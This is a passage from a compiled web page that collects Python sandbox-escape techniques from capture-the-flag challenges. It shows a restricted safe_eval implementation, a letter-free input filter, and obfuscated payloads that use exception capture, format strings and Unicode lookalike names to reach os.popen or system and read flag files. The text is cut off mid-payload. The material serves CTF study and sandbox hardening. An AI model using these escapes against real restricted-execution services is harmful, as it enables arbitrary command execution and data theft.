        self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">False</span>
        self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">False</span>

        builtins <span class="token operator">=</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"__builtins__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>_builtins <span class="token operator">=</span> builtins

    <span class="token keyword">def</span> <span class="token function">visit_Name</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Name<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span><span class="token builtin">id</span> <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">visit_Attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> node<span class="token punctuation">:</span> ast<span class="token punctuation">.</span>Attribute<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_private_entity <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span>attr <span class="token keyword">not</span> <span class="token keyword">in</span> ALLOWED_BUILTINS <span class="token keyword">and</span> node<span class="token punctuation">.</span>attr <span class="token keyword">in</span> self<span class="token punctuation">.</span>_builtins<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>
        self<span class="token punctuation">.</span>generic_visit<span class="token punctuation">(</span>node<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_contains_protected_access</span><span class="token punctuation">(</span>code<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>
    <span class="token comment"># do not allow imports</span>
    imports_modules <span class="token operator">=</span> <span class="token boolean">False</span>
    tree <span class="token operator">=</span> ast<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    <span class="token keyword">for</span> node <span class="token keyword">in</span> ast<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>tree<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>Import<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">elif</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>node<span class="token punctuation">,</span> ast<span class="token punctuation">.</span>ImportFrom<span class="token punctuation">)</span><span class="token punctuation">:</span>
            imports_modules <span class="token operator">=</span> <span class="token boolean">True</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>

    dunder_visitor <span class="token operator">=</span> DunderVisitor<span class="token punctuation">(</span><span class="token punctuation">)</span>
    dunder_visitor<span class="token punctuation">.</span>visit<span class="token punctuation">(</span>tree<span class="token punctuation">)</span>

    <span class="token keyword">for</span> vulnerable_code_snippet <span class="token keyword">in</span> vulnerable_code_snippets<span class="token punctuation">:</span>
        <span class="token keyword">if</span> vulnerable_code_snippet <span class="token keyword">in</span> code<span class="token punctuation">:</span>
            dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin <span class="token operator">=</span> <span class="token boolean">True</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        dunder_visitor<span class="token punctuation">.</span>has_access_to_private_entity
        <span class="token keyword">or</span> dunder_visitor<span class="token punctuation">.</span>has_access_to_disallowed_builtin
        <span class="token keyword">or</span> imports_modules
    <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">_verify_source_safety</span><span class="token punctuation">(</span>__source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> CodeType<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"Direct execution of CodeType is forbidden!"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        __source <span class="token operator">=</span> __source<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> _contains_protected_access<span class="token punctuation">(</span>__source<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span>
            <span class="token string">"Execution of code containing references to private or dunder methods, "</span>
            <span class="token string">"disallowed builtins, or any imports, is forbidden!"</span>
        <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> Any<span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_exec</span><span class="token punctuation">(</span>
    __source<span class="token punctuation">:</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> CodeType<span class="token punctuation">]</span><span class="token punctuation">,</span>
    __globals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
    __locals<span class="token punctuation">:</span> Union<span class="token punctuation">[</span>Mapping<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    eval within safe global context.
    """</span>
    _verify_source_safety<span class="token punctuation">(</span>__source<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token keyword">exec</span><span class="token punctuation">(</span>__source<span class="token punctuation">,</span> _get_restricted_globals<span class="token punctuation">(</span>__globals<span class="token punctuation">)</span><span class="token punctuation">,</span> __locals<span class="token punctuation">)</span></code>`,El,cn,So,Bo,Ii,hl,ln,g2=`<code class="language-py"><span class="token comment"># Using "with"-statement context managers to expose/retrieve Exception classes</span>
<span class="token comment"># https://rszalski.github.io/magicmethods/#context</span>
ss <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
obj <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
cus <span class="token operator">=</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>obj<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">"\\137\\137exit\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">,</span>e<span class="token punctuation">,</span>v<span class="token punctuation">,</span>t<span class="token punctuation">:</span> <span class="token punctuation">[</span>ss<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"\\137\\137enter\\137\\137"</span><span class="token punctuation">:</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
f <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token boolean">None</span>
<span class="token keyword">with</span> cus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    obj<span class="token punctuation">.</span>lol
<span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>
ex <span class="token operator">=</span> ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token string">"&#123;0.\\137\\137globals\\137\\137[\\137\\137builtins\\137\\137][\\137\\137import\\137\\137].lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token string">"&#123;0.popen.lol&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> ex <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>obj<span class="token punctuation">(</span><span class="token string">"cat /flag*"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#EOF</span></code>`,xl,un,Sp,Di,Cl,rn,qo,zo,ji,Ll,kn,w2=`<code class="language-py"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># no letters</span>
    alphabet <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
    <span class="token comment"># no numbers</span>
    numbers <span class="token operator">=</span> <span class="token string">"0123456789"</span>
    <span class="token comment"># no underscores</span>
    underscore <span class="token operator">=</span> <span class="token string">"__"</span>

    <span class="token keyword">return</span> <span class="token keyword">not</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token keyword">in</span> alphabet<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>c <span class="token keyword">in</span> numbers<span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>underscore <span class="token keyword">in</span> code<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> code<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">safe_eval</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>check<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        g <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span>
        l <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> g<span class="token punctuation">,</span> l <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># good luck!</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lol no"</span><span class="token punctuation">)</span>

code <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">">>> "</span><span class="token punctuation">)</span>
safe_eval<span class="token punctuation">(</span>code<span class="token punctuation">)</span></code>`,Tl,_n,Wo,Yo,Ni,Al,dn,v2=`<code class="language-py"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F_<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D633}\u{1D626}\u{1D628}\u{1D62A}\u{1D634}\u{1D635}\u{1D626}\u{1D633}<span class="token punctuation">.</span>_\uFF3F\u{1D623}\u{1D636}\u{1D62A}\u{1D62D}\u{1D635}\u{1D62A}\u{1D62F}\u{1D634}\uFF3F_<span class="token punctuation">.</span>\u{1D637}\u{1D622}\u{1D62D}\u{1D636}\u{1D626}\u{1D634}<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\u{1D634}\u{1D63A}\u{1D634}\u{1D635}\u{1D626}\u{1D62E}<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">""</span><span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F_<span class="token punctuation">.</span>_\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F_<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># https://github.com/UofTCTF/uoftctf-2024-chals-public/blob/master/Jail/zero/solve/writeup.md</span>
<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\uFF3F\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\uFF3F<span class="token punctuation">.</span>\uFF3F\u{1D623}\u{1D622}\u{1D634}\u{1D626}\u{1D634}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\uFF3F\u{1D634}\u{1D636}\u{1D623}\u{1D624}\u{1D62D}\u{1D622}\u{1D634}\u{1D634}\u{1D626}\u{1D634}\uFF3F<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\u{1D628}\u{1D626}\u{1D635}_\u{1D625}\u{1D622}\u{1D635}\u{1D622}<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>\uFF3F\u{1D625}\u{1D630}\u{1D624}\uFF3F<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token 